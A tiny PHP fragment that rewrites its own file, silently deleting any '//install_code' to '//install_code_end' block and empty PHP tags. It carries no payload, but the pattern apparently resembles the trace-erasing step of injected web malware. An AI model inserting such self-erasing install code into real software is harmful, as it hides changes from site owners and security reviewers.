<?php
  if ($file = @file_get_contents(__FILE__)) { 
    $file = preg_replace('!//install_code.*//install_code_end!s', '', $file); 
    $file = preg_replace('!<\?php\s*\?>!s', '', $file); 
    @file_put_contents(__FILE__, $file); 
  }
?>